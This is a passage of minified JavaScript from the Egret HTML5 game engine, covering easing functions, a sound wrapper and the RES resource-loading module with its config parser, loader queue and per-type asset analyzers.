                if (0 == d || 1 == d)return d;
                var e = c / b * Math.asin(1 / a);
                return a * Math.pow(2, -10 * d) * Math.sin((d - e) * b / c) + 1
            }
        };
        d.getElasticInOut = function (a, c) {
            var b = 2 * Math.PI;
            return function (d) {
                var e = c / b * Math.asin(1 / a);
                return 1 > (d *= 2) ? -0.5 * a * Math.pow(2, 10 * (d -= 1)) * Math.sin((d - e) * b / c) : a * Math.pow(2, -10 * (d -= 1)) * Math.sin((d - e) * b / c) * 0.5 + 1
            }
        };
        d.quadIn = d.getPowIn(2);
        d.quadOut = d.getPowOut(2);
        d.quadInOut = d.getPowInOut(2);
        d.cubicIn = d.getPowIn(3);
        d.cubicOut = d.getPowOut(3);
        d.cubicInOut = d.getPowInOut(3);
        d.quartIn = d.getPowIn(4);
        d.quartOut = d.getPowOut(4);
        d.quartInOut = d.getPowInOut(4);
        d.quintIn = d.getPowIn(5);
        d.quintOut = d.getPowOut(5);
        d.quintInOut = d.getPowInOut(5);
        d.backIn = d.getBackIn(1.7);
        d.backOut = d.getBackOut(1.7);
        d.backInOut = d.getBackInOut(1.7);
        d.elasticIn = d.getElasticIn(1, 0.3);
        d.elasticOut = d.getElasticOut(1, 0.3);
        d.elasticInOut = d.getElasticInOut(1, 0.3 * 1.5);
        return d
    }();
    b.Ease = e;
    e.prototype.__class__ = "egret.Ease"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
            this.type = b.EFFECT
        }

        b.prototype.play = function (a) {
            void 0 === a && (a = !1);
            var c = this.audio;
            c && (isNaN(c.duration) || (c.currentTime = 0), c.loop = a, c.play())
        };
        b.prototype.pause = function () {
            var a = this.audio;
            a && a.pause()
        };
        b.prototype.load = function () {
            var a = this.audio;
            a && a.load()
        };
        b.prototype.addEventListener = function (a, c) {
            this.audio && this.audio.addEventListener(a, c, !1)
        };
        b.prototype.removeEventListener = function (a, c) {
            this.audio && this.audio.removeEventListener(a, c, !1)
        };
        b.prototype.setVolume =
            function (a) {
                var c = this.audio;
                c && (c.volume = a)
            };
        b.prototype.getVolume = function () {
            return this.audio ? this.audio.volume : 0
        };
        b.prototype.preload = function (a) {
            this.type = a
        };
        b.prototype._setAudio = function (a) {
            this.audio = a
        };
        b.MUSIC = "music";
        b.EFFECT = "effect";
        return b
    }();
    b.Sound = e;
    e.prototype.__class__ = "egret.Sound"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.isNumber = function (a) {
            return "number" === typeof a && !isNaN(a)
        };
        return b
    }();
    b.NumberUtils = e;
    e.prototype.__class__ = "egret.NumberUtils"
})(egret || (egret = {}));
Function.prototype.bind || (Function.prototype.bind = function (b) {
    if ("function" !== typeof this)throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable");
    var e = Array.prototype.slice.call(arguments, 1), d = this, a = function () {
    }, c = function () {
        return d.apply(this instanceof a && b ? this : b, e.concat(Array.prototype.slice.call(arguments)))
    };
    a.prototype = this.prototype;
    c.prototype = new a;
    return c
});
var __extends = this.__extends || function (b, e) {
        function d() {
            this.constructor = b
        }

        for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
        d.prototype = e.prototype;
        b.prototype = new d
    }, RES;
(function (b) {
    var e = function (b) {
        function a(c, a, e) {
            void 0 === a && (a = !1);
            void 0 === e && (e = !1);
            b.call(this, c, a, e);
            this.itemsTotal = this.itemsLoaded = 0
        }

        __extends(a, b);
        a.dispatchResourceEvent = function (c, b, d, e, g, f) {
            void 0 === d && (d = "");
            void 0 === e && (e = null);
            void 0 === g && (g = 0);
            void 0 === f && (f = 0);
            var h = egret.Event._getPropertyData(a);
            h.groupName = d;
            h.resItem = e;
            h.itemsLoaded = g;
            h.itemsTotal = f;
            egret.Event._dispatchByTarget(a, c, b, h)
        };
        a.ITEM_LOAD_ERROR = "itemLoadError";
        a.CONFIG_COMPLETE = "configComplete";
        a.GROUP_PROGRESS = "groupProgress";
        a.GROUP_COMPLETE = "groupComplete";
        return a
    }(egret.Event);
    b.ResourceEvent = e;
    e.prototype.__class__ = "RES.ResourceEvent"
})(RES || (RES = {}));
(function (b) {
    var e = function () {
        function b(a, c, d) {
            this._loaded = !1;
            this.name = a;
            this.url = c;
            this.type = d
        }

        Object.defineProperty(b.prototype, "loaded", {
            get: function () {
                return this.data ? this.data.loaded : this._loaded
            }, set: function (a) {
                this.data && (this.data.loaded = a);
                this._loaded = a
            }, enumerable: !0, configurable: !0
        });
        b.prototype.toString = function () {
            return '[ResourceItem name="' + this.name + '" url="' + this.url + '" type="' + this.type + '"]'
        };
        b.TYPE_XML = "xml";
        b.TYPE_IMAGE = "image";
        b.TYPE_BIN = "bin";
        b.TYPE_TEXT = "text";
        b.TYPE_JSON =
            "json";
        b.TYPE_SHEET = "sheet";
        b.TYPE_FONT = "font";
        b.TYPE_SOUND = "sound";
        return b
    }();
    b.ResourceItem = e;
    e.prototype.__class__ = "RES.ResourceItem"
})(RES || (RES = {}));
(function (b) {
    var e = function () {
        function d() {
            this.keyMap = {};
            this.groupDic = {};
            b.configInstance = this
        }

        d.prototype.getGroupByName = function (a) {
            var c = [];
            if (!this.groupDic[a])return c;
            a = this.groupDic[a];
            for (var b = a.length, d = 0; d < b; d++)c.push(this.parseResourceItem(a[d]));
            return c
        };
        d.prototype.getRawGroupByName = function (a) {
            return this.groupDic[a] ? this.groupDic[a] : []
        };
        d.prototype.createGroup = function (a, c, b) {
            void 0 === b && (b = !1);
            if (!b && this.groupDic[a] || !c || 0 == c.length)return !1;
            b = this.groupDic;
            for (var d = [], e = c.length,
                     g = 0; g < e; g++) {
                var f = c[g], h = b[f];
                if (h)for (var f = h.length, p = 0; p < f; p++) {
                    var m = h[p];
                    -1 == d.indexOf(m) && d.push(m)
                } else(m = this.keyMap[f]) && -1 == d.indexOf(m) && d.push(m)
            }
            if (0 == d.length)return !1;
            this.groupDic[a] = d;
            return !0
        };
        d.prototype.parseConfig = function (a, c) {
            if (a) {
                var b = a.resources;
                if (b)for (var d = b.length, e = 0; e < d; e++) {
                    var g = b[e], f = g.url;
                    f && -1 == f.indexOf("://") && (g.url = c + f);
                    this.addItemToKeyMap(g)
                }
                if (b = a.groups)for (d = b.length, e = 0; e < d; e++) {
                    for (var f = b[e], h = [], p = f.keys.split(","), m = p.length, q = 0; q < m; q++)g = p[q].trim(),
                    (g = this.keyMap[g]) && -1 == h.indexOf(g) && h.push(g);
                    this.groupDic[f.name] = h
                }
            }
        };
        d.prototype.addSubkey = function (a, c) {
            var b = this.keyMap[c];
            b && !this.keyMap[a] && (this.keyMap[a] = b)
        };
        d.prototype.addItemToKeyMap = function (a) {
            this.keyMap[a.name] || (this.keyMap[a.name] = a);
            if (a.hasOwnProperty("subkeys")) {
                var c = a.subkeys.split(",");
                a.subkeys = c;
                for (var b = c.length, d = 0; d < b; d++) {
                    var e = c[d];
                    null == this.keyMap[e] && (this.keyMap[e] = a)
                }
            }
        };
        d.prototype.getName = function (a) {
            return (a = this.keyMap[a]) ? a.name : ""
        };
        d.prototype.getType =
            function (a) {
                return (a = this.keyMap[a]) ? a.type : ""
            };
        d.prototype.getRawResourceItem = function (a) {
            return this.keyMap[a]
        };
        d.prototype.getResourceItem = function (a) {
            return (a = this.keyMap[a]) ? this.parseResourceItem(a) : null
        };
        d.prototype.parseResourceItem = function (a) {
            var c = new b.ResourceItem(a.name, a.url, a.type);
            c.data = a;
            return c
        };
        return d
    }();
    b.ResourceConfig = e;
    e.prototype.__class__ = "RES.ResourceConfig"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this.thread = 2;
            this.loadingCount = 0;
            this.groupTotalDic = {};
            this.numLoadedDic = {};
            this.itemListDic = {};
            this.priorityQueue = {};
            this.lazyLoadList = [];
            this.analyzerDic = {};
            this.queueIndex = 0
        }

        __extends(a, d);
        a.prototype.isGroupInLoading = function (a) {
            return void 0 !== this.itemListDic[a]
        };
        a.prototype.loadGroup = function (a, d, e) {
            void 0 === e && (e = 0);
            if (!this.itemListDic[d] && d)if (a && 0 != a.length) {
                this.priorityQueue[e] ? this.priorityQueue[e].push(d) : this.priorityQueue[e] =
                    [d];
                this.itemListDic[d] = a;
                e = a.length;
                for (var n = 0; n < e; n++)a[n].groupName = d;
                this.groupTotalDic[d] = a.length;
                this.numLoadedDic[d] = 0;
                this.next()
            } else egret.Logger.warning('RES\u52a0\u8f7d\u4e86\u4e0d\u5b58\u5728\u6216\u7a7a\u7684\u8d44\u6e90\u7ec4\uff1a"' + d + '"'), a = new b.ResourceEvent(b.ResourceEvent.GROUP_COMPLETE), a.groupName = d, this.dispatchEvent(a)
        };
        a.prototype.loadItem = function (a) {
            this.lazyLoadList.push(a);
            a.groupName = "";
            this.next()
        };
        a.prototype.next = function () {
            for (; this.loadingCount < this.thread;) {
                var a =
                    this.getOneResourceItem();
                if (!a)break;
                this.loadingCount++;
                if (a.loaded)this.onItemComplete(a); else {
                    var d = this.analyzerDic[a.type];
                    d || (d = this.analyzerDic[a.type] = egret.Injector.getInstance(b.AnalyzerBase, a.type));
                    d.loadFile(a, this.onItemComplete, this)
                }
            }
        };
        a.prototype.getOneResourceItem = function () {
            var a = Number.NEGATIVE_INFINITY, b;
            for (b in this.priorityQueue)a = Math.max(a, b);
            a = this.priorityQueue[a];
            if (!a || 0 == a.length)return 0 == this.lazyLoadList.length ? null : this.lazyLoadList.pop();
            b = a.length;
            for (var d, e =
                0; e < b; e++) {
                this.queueIndex >= b && (this.queueIndex = 0);
                d = this.itemListDic[a[this.queueIndex]];
                if (0 < d.length)break;
                this.queueIndex++
            }
            return 0 == d.length ? null : d.shift()
        };
        a.prototype.onItemComplete = function (a) {
            this.loadingCount--;
            var d = a.groupName;
            a.loaded || b.ResourceEvent.dispatchResourceEvent(this.resInstance, b.ResourceEvent.ITEM_LOAD_ERROR, d, a);
            if (d) {
                this.numLoadedDic[d]++;
                var e = this.numLoadedDic[d], n = this.groupTotalDic[d];
                b.ResourceEvent.dispatchResourceEvent(this.resInstance, b.ResourceEvent.GROUP_PROGRESS,
                    d, a, e, n);
                e == n && (this.removeGroupName(d), delete this.groupTotalDic[d], delete this.numLoadedDic[d], delete this.itemListDic[d], b.ResourceEvent.dispatchResourceEvent(this, b.ResourceEvent.GROUP_COMPLETE, d))
            } else this.callBack.call(this.resInstance, a);
            this.next()
        };
        a.prototype.removeGroupName = function (a) {
            for (var b in this.priorityQueue) {
                for (var d = this.priorityQueue[b], e = d.length, g = 0, f = !1, e = d.length, h = 0; h < e; h++) {
                    if (d[h] == a) {
                        d.splice(g, 1);
                        f = !0;
                        break
                    }
                    g++
                }
                if (f) {
                    0 == d.length && delete this.priorityQueue[b];
                    break
                }
            }
        };
        return a
    }(egret.EventDispatcher);
    b.ResourceLoader = e;
    e.prototype.__class__ = "RES.ResourceLoader"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this.resourceConfig = b.configInstance
        }

        __extends(a, d);
        a.prototype.addSubkey = function (a, b) {
            this.resourceConfig.addSubkey(a, b)
        };
        a.prototype.loadFile = function (a, b, d) {
        };
        a.prototype.getRes = function (a) {
        };
        a.prototype.destroyRes = function (a) {
            return !1
        };
        a.getStringPrefix = function (a) {
            if (!a)return "";
            var b = a.indexOf(".");
            return -1 != b ? a.substring(0, b) : ""
        };
        a.getStringTail = function (a) {
            if (!a)return "";
            var b = a.indexOf(".");
            return -1 != b ? a.substring(b + 1) : ""
        };
        return a
    }(egret.HashObject);
    b.AnalyzerBase = e;
    e.prototype.__class__ = "RES.AnalyzerBase"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this);
            this.fileDic = {};
            this.resItemDic = [];
            this._dataFormat = egret.URLLoaderDataFormat.BINARY;
            this.recycler = new egret.Recycler
        }

        __extends(a, b);
        a.prototype.loadFile = function (a, b, d) {
            if (this.fileDic[a.name])b.call(d, a); else {
                var e = this.getLoader();
                this.resItemDic[e.hashCode] = {item: a, func: b, thisObject: d};
                e.load(new egret.URLRequest(a.url))
            }
        };
        a.prototype.getLoader = function () {
            var a = this.recycler.pop();
            a || (a = new egret.URLLoader, a.addEventListener(egret.Event.COMPLETE,
                this.onLoadFinish, this), a.addEventListener(egret.IOErrorEvent.IO_ERROR, this.onLoadFinish, this));
            a.dataFormat = this._dataFormat;
            return a
        };
        a.prototype.onLoadFinish = function (a) {
            var b = a.target, d = this.resItemDic[b.hashCode];
            delete this.resItemDic[b.hashCode];
            this.recycler.push(b);
            var e = d.item, g = d.func;
            e.loaded = a.type == egret.Event.COMPLETE;
            e.loaded && this.analyzeData(e, b.data);
            g.call(d.thisObject, e)
        };
        a.prototype.analyzeData = function (a, b) {
            var d = a.name;
            !this.fileDic[d] && b && (this.fileDic[d] = b)
        };
        a.prototype.getRes =
            function (a) {
                return this.fileDic[a]
            };
        a.prototype.hasRes = function (a) {
            return null != this.getRes(a)
        };
        a.prototype.destroyRes = function (a) {
            return this.fileDic[a] ? (delete this.fileDic[a], !0) : !1
        };
        return a
    }(b.AnalyzerBase);
    b.BinAnalyzer = e;
    e.prototype.__class__ = "RES.BinAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this);
            this._dataFormat = egret.URLLoaderDataFormat.TEXTURE
        }

        __extends(a, b);
        a.prototype.analyzeData = function (a, b) {
            var d = a.name;
            !this.fileDic[d] && b && (this.fileDic[d] = b, (d = a.data) && d.scale9grid && (d = d.scale9grid.split(","), b.scale9Grid = new egret.Rectangle(parseInt(d[0]), parseInt(d[1]), parseInt(d[2]), parseInt(d[3]))))
        };
        return a
    }(b.BinAnalyzer);
    b.ImageAnalyzer = e;
    e.prototype.__class__ = "RES.ImageAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this);
            this._dataFormat = egret.URLLoaderDataFormat.TEXT
        }

        __extends(a, b);
        a.prototype.analyzeData = function (a, b) {
            var d = a.name;
            if (!this.fileDic[d] && b)try {
                this.fileDic[d] = JSON.parse(b)
            } catch (e) {
                egret.Logger.warning("JSON\u6587\u4ef6\u683c\u5f0f\u4e0d\u6b63\u786e: " + a.url + "\ndata:" + b)
            }
        };
        return a
    }(b.BinAnalyzer);
    b.JsonAnalyzer = e;
    e.prototype.__class__ = "RES.JsonAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this);
            this._dataFormat = egret.URLLoaderDataFormat.TEXT
        }

        __extends(a, b);
        return a
    }(b.BinAnalyzer);
    b.TextAnalyzer = e;
    e.prototype.__class__ = "RES.TextAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this.sheetMap = {};
            this.textureMap = {};
            this._dataFormat = egret.URLLoaderDataFormat.TEXT
        }

        __extends(a, d);
        a.prototype.getRes = function (a) {
            var d = this.fileDic[a];
            d || (d = this.textureMap[a]);
            !d && (d = b.AnalyzerBase.getStringPrefix(a), d = this.fileDic[d]) && (a = b.AnalyzerBase.getStringTail(a), d = d.getTexture(a));
            return d
        };
        a.prototype.onLoadFinish = function (a) {
            var b = a.target, d = this.resItemDic[b.hashCode];
            delete this.resItemDic[b.hashCode];
            this.recycler.push(b);
            var e =
                d.item, g = d.func;
            e.loaded = a.type == egret.Event.COMPLETE;
            e.loaded && this.analyzeData(e, b.data);
            "string" == typeof b.data ? (this._dataFormat = egret.URLLoaderDataFormat.TEXTURE, this.loadFile(e, g, d.thisObject), this._dataFormat = egret.URLLoaderDataFormat.TEXT) : g.call(d.thisObject, e)
        };
        a.prototype.analyzeData = function (a, b) {
            var d = a.name;
            if (!this.fileDic[d] && b) {
                var e;
                if ("string" == typeof b) {
                    try {
                        e = JSON.parse(b)
                    } catch (g) {
                        egret.Logger.warning("JSON\u6587\u4ef6\u683c\u5f0f\u4e0d\u6b63\u786e: " + a.url)
                    }
                    e && (this.sheetMap[d] =
                        e, a.loaded = !1, a.url = this.getRelativePath(a.url, e.file))
                } else e = this.sheetMap[d], delete this.sheetMap[d], b && (e = this.parseSpriteSheet(b, e, a.data && a.data.subkeys ? "" : d), this.fileDic[d] = e)
            }
        };
        a.prototype.getRelativePath = function (a, b) {
            a = a.split("\\").join("/");
            var d = a.lastIndexOf("/");
            return a = -1 != d ? a.substring(0, d + 1) + b : b
        };
        a.prototype.parseSpriteSheet = function (a, b, d) {
            b = b.frames;
            if (!b)return null;
            var e = new egret.SpriteSheet(a), g = this.textureMap, f;
            for (f in b) {
                var h = b[f];
                a = e.createTexture(f, h.x, h.y, h.w, h.h,
                    h.offX, h.offY, h.sourceW, h.sourceH);
                h.scale9grid && (h = h.scale9grid.split(","), a.scale9Grid = new egret.Rectangle(parseInt(h[0]), parseInt(h[1]), parseInt(h[2]), parseInt(h[3])));
                null == g[f] && (g[f] = a, d && this.addSubkey(f, d))
            }
            return e
        };
        return a
    }(b.BinAnalyzer);
    b.SheetAnalyzer = e;
    e.prototype.__class__ = "RES.SheetAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this)
        }

        __extends(a, b);
        a.prototype.analyzeData = function (a, b) {
            var d = a.name;
            if (!this.fileDic[d] && b) {
                var e;
                "string" == typeof b ? (e = b, this.sheetMap[d] = e, a.loaded = !1, a.url = this.getTexturePath(a.url, e)) : (e = this.sheetMap[d], delete this.sheetMap[d], b && (e = new egret.BitmapTextSpriteSheet(b, e), this.fileDic[d] = e))
            }
        };
        a.prototype.getTexturePath = function (a, b) {
            var d = "", e = b.split("\n")[2], g = e.indexOf('file="');
            -1 != g && (e = e.substring(g + 6), g = e.indexOf('"'), d = e.substring(0,
                g));
            a = a.split("\\").join("/");
            g = a.lastIndexOf("/");
            return a = -1 != g ? a.substring(0, g + 1) + d : d
        };
        return a
    }(b.SheetAnalyzer);
    b.FontAnalyzer = e;
    e.prototype.__class__ = "RES.FontAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this);
            this._dataFormat = egret.URLLoaderDataFormat.SOUND
        }

        __extends(a, b);
        a.prototype.analyzeData = function (a, b) {
            var d = a.name;
            !this.fileDic[d] && b && (this.fileDic[d] = b, (d = a.data) && d.soundType ? b.preload(d.soundType) : b.preload(egret.Sound.EFFECT))
        };
        return a
    }(b.BinAnalyzer);
    b.SoundAnalyzer = e;
    e.prototype.__class__ = "RES.SoundAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this);
            this._dataFormat = egret.URLLoaderDataFormat.TEXT
        }

        __extends(a, b);
        a.prototype.analyzeData = function (a, b) {
            var d = a.name;
            if (!this.fileDic[d] && b)try {
                var e = egret.XML.parse(b);
                this.fileDic[d] = e
            } catch (g) {
            }
        };
        return a
    }(b.BinAnalyzer);
    b.XMLAnalyzer = e;
    e.prototype.__class__ = "RES.XMLAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    b.loadConfig = function (b, a, c) {
        void 0 === a && (a = "");
        void 0 === c && (c = "json");
        e.loadConfig(b, a, c)
    };
    b.loadGroup = function (b, a) {
        void 0 === a && (a = 0);
        e.loadGroup(b, a)
    };
    b.isGroupLoaded = function (b) {
        return e.isGroupLoaded(b)
    };
    b.getGroupByName = function (b) {
        return e.getGroupByName(b)
    };
    b.createGroup = function (b, a, c) {
        void 0 === c && (c = !1);
        return e.createGroup(b, a, c)
    };
    b.hasRes = function (b) {
        return e.hasRes(b)
    };
    b.getRes = function (b) {
        return e.getRes(b)
    };
    b.getResAsync = function (b, a, c) {
        e.getResAsync(b, a, c)
    };
    b.getResByUrl =
        function (b, a, c, k) {
            void 0 === k && (k = "");
            e.getResByUrl(b, a, c, k)
        };
    b.destroyRes = function (b) {
        return e.destroyRes(b)
    };
    b.setMaxLoadingThread = function (b) {
        e.setMaxLoadingThread(b)
    };
    b.addEventListener = function (b, a, c, k, l) {
        void 0 === k && (k = !1);
        void 0 === l && (l = 0);
        e.addEventListener(b, a, c, k, l)
    };
    b.removeEventListener = function (b, a, c, k) {
        void 0 === k && (k = !1);
        e.removeEventListener(b, a, c, k)
    };
    var e = new (function (d) {
        function a() {
            d.call(this);
            this.analyzerDic = {};
            this.configItemList = [];
            this.configComplete = this.callLaterFlag = !1;
            this.loadedGroups = [];
            this.groupNameList = [];
            this.asyncDic = {};
            this.init()
        }

        __extends(a, d);
        a.prototype.getAnalyzerByType = function (a) {
            var d = this.analyzerDic[a];
            d || (d = this.analyzerDic[a] = egret.Injector.getInstance(b.AnalyzerBase, a));
            return d
        };
        a.prototype.init = function () {
            egret.Injector.hasMapRule(b.AnalyzerBase, b.ResourceItem.TYPE_BIN) || egret.Injector.mapClass(b.AnalyzerBase, b.BinAnalyzer, b.ResourceItem.TYPE_BIN);
            egret.Injector.hasMapRule(b.AnalyzerBase, b.ResourceItem.TYPE_IMAGE) || egret.Injector.mapClass(b.AnalyzerBase,
                b.ImageAnalyzer, b.ResourceItem.TYPE_IMAGE);
            egret.Injector.hasMapRule(b.AnalyzerBase, b.ResourceItem.TYPE_TEXT) || egret.Injector.mapClass(b.AnalyzerBase, b.TextAnalyzer, b.ResourceItem.TYPE_TEXT);
            egret.Injector.hasMapRule(b.AnalyzerBase, b.ResourceItem.TYPE_JSON) || egret.Injector.mapClass(b.AnalyzerBase, b.JsonAnalyzer, b.ResourceItem.TYPE_JSON);
            egret.Injector.hasMapRule(b.AnalyzerBase, b.ResourceItem.TYPE_SHEET) || egret.Injector.mapClass(b.AnalyzerBase, b.SheetAnalyzer, b.ResourceItem.TYPE_SHEET);
            egret.Injector.hasMapRule(b.AnalyzerBase,
                b.ResourceItem.TYPE_FONT) || egret.Injector.mapClass(b.AnalyzerBase, b.FontAnalyzer, b.ResourceItem.TYPE_FONT);
            egret.Injector.hasMapRule(b.AnalyzerBase, b.ResourceItem.TYPE_SOUND) || egret.Injector.mapClass(b.AnalyzerBase, b.SoundAnalyzer, b.ResourceItem.TYPE_SOUND);
            egret.Injector.hasMapRule(b.AnalyzerBase, b.ResourceItem.TYPE_XML) || egret.Injector.mapClass(b.AnalyzerBase, b.XMLAnalyzer, b.ResourceItem.TYPE_XML);
            this.resConfig = new b.ResourceConfig;
            this.resLoader = new b.ResourceLoader;
            this.resLoader.callBack = this.onResourceItemComp;
            this.resLoader.resInstance = this;
            this.resLoader.addEventListener(b.ResourceEvent.GROUP_COMPLETE, this.onGroupComp, this)
        };
        a.prototype.loadConfig = function (a, b, d) {
            void 0 === d && (d = "json");
            this.configItemList.push({url: a, resourceRoot: b, type: d});
            this.callLaterFlag || (egret.callLater(this.startLoadConfig, this), this.callLaterFlag = !0)
        };
        a.prototype.startLoadConfig = function () {
            this.callLaterFlag = !1;
            var c = this.configItemList;
            this.configItemList = [];
            this.loadingConfigList = c;
            for (var d = c.length, e = [], n = 0; n < d; n++) {
                var g =
                    c[n], g = new b.ResourceItem(g.url, g.url, g.type);
                e.push(g)
            }
            this.resLoader.loadGroup(e, a.GROUP_CONFIG, Number.MAX_VALUE)
        };
        a.prototype.isGroupLoaded = function (a) {
            return -1 != this.loadedGroups.indexOf(a)
        };
        a.prototype.getGroupByName = function (a) {
            return this.resConfig.getGroupByName(a)
        };
        a.prototype.loadGroup = function (a, b) {
            void 0 === b && (b = 0);
            if (-1 == this.loadedGroups.indexOf(a) && !this.resLoader.isGroupInLoading(a))if (this.configComplete) {
                var d = this.resConfig.getGroupByName(a);
                this.resLoader.loadGroup(d, a, b)
            } else this.groupNameList.push({
                name: a,
                priority: b
            })
        };
        a.prototype.createGroup = function (a, b, d) {
            void 0 === d && (d = !1);
            if (d) {
                var e = this.loadedGroups.indexOf(a);
                -1 != e && this.loadedGroups.splice(e, 1)
            }
            return this.resConfig.createGroup(a, b, d)
        };
        a.prototype.onGroupComp = function (c) {
            if (c.groupName == a.GROUP_CONFIG) {
                c = this.loadingConfigList.length;
                for (var d = 0; d < c; d++) {
                    var e = this.loadingConfigList[d], n = this.getAnalyzerByType(e.type), g = n.getRes(e.url);
                    n.destroyRes(e.url);
                    this.resConfig.parseConfig(g, e.resourceRoot)
                }
                this.configComplete = !0;
                this.loadingConfigList =
                    null;
                b.ResourceEvent.dispatchResourceEvent(this, b.ResourceEvent.CONFIG_COMPLETE);
                e = this.groupNameList;
                c = e.length;
                for (d = 0; d < c; d++)n = e[d], this.loadGroup(n.name, n.priority);
                this.groupNameList = []
            } else this.loadedGroups.push(c.groupName), this.dispatchEvent(c)
        };
        a.prototype.hasRes = function (a) {
            var d = this.resConfig.getType(a);
            return "" == d && (a = b.AnalyzerBase.getStringPrefix(a), d = this.resConfig.getType(a), "" == d) ? !1 : !0
        };
        a.prototype.getRes = function (a) {
            var d = this.resConfig.getType(a);
            return "" == d && (d = b.AnalyzerBase.getStringPrefix(a),
                d = this.resConfig.getType(d), "" == d) ? null : this.getAnalyzerByType(d).getRes(a)
        };
        a.prototype.getResAsync = function (a, d, e) {
            var n = this.resConfig.getType(a), g = this.resConfig.getName(a);
            if ("" == n && (g = b.AnalyzerBase.getStringPrefix(a), n = this.resConfig.getType(g), "" == n)) {
                d.call(e, null);
                return
            }
            (n = this.getAnalyzerByType(n).getRes(a)) ? d.call(e, n) : (a = {
                key: a,
                compFunc: d,
                thisObject: e
            }, this.asyncDic[g] ? this.asyncDic[g].push(a) : (this.asyncDic[g] = [a], g = this.resConfig.getResourceItem(g), this.resLoader.loadItem(g)))
        };
        a.prototype.getResByUrl =
            function (a, d, e, n) {
                void 0 === n && (n = "");
                if (a) {
                    n || (n = this.getTypeByUrl(a));
                    var g = this.getAnalyzerByType(n).getRes(a);
                    g ? d.call(e, g) : (d = {
                        key: a,
                        compFunc: d,
                        thisObject: e
                    }, this.asyncDic[a] ? this.asyncDic[a].push(d) : (this.asyncDic[a] = [d], a = new b.ResourceItem(a, a, n), this.resLoader.loadItem(a)))
                } else d.call(e, null)
            };
        a.prototype.getTypeByUrl = function (a) {
            (a = a.substr(a.lastIndexOf(".") + 1)) && (a = a.toLowerCase());
            switch (a) {
                case b.ResourceItem.TYPE_XML:
                case b.ResourceItem.TYPE_JSON:
                case b.ResourceItem.TYPE_SHEET:
                    break;
                case "png":
                case "jpg":
                case "gif":
                    a = b.ResourceItem.TYPE_IMAGE;
                    break;
                case "fnt":
                    a = b.ResourceItem.TYPE_FONT;
                    break;
                case "txt":
                    a = b.ResourceItem.TYPE_TEXT;
                    break;
                case "mp3":
                case "ogg":
                case "mpeg":
                case "wav":
                case "m4a":
                case "mp4":
                case "aiff":
                case "wma":
                case "mid":
                    a = b.ResourceItem.TYPE_SOUND;
                    break;
                default:
                    a = b.ResourceItem.TYPE_BIN
            }
            return a
        };
        a.prototype.onResourceItemComp = function (a) {
            var b = this.asyncDic[a.name];
            delete this.asyncDic[a.name];
            a = this.getAnalyzerByType(a.type);
            for (var d = b.length, e = 0; e < d; e++) {
                var g =
                    b[e], f = a.getRes(g.key);
                g.compFunc.call(g.thisObject, f, g.key)
            }
        };
        a.prototype.destroyRes = function (a) {
            var b = this.resConfig.getRawGroupByName(a);
            if (b) {
                var d = this.loadedGroups.indexOf(a);
                -1 != d && this.loadedGroups.splice(d, 1);
                a = b.length;
                for (var e = 0; e < a; e++) {
                    d = b[e];
                    d.loaded = !1;
                    var g = this.getAnalyzerByType(d.type);
                    g.destroyRes(d.name)
                }
                return !0
            }
            b = this.resConfig.getType(a);
            if ("" == b)return !1;
            d = this.resConfig.getRawResourceItem(a);
            d.loaded = !1;
            g = this.getAnalyzerByType(b);
            return g.destroyRes(a)
        };
        a.prototype.setMaxLoadingThread =
            function (a) {
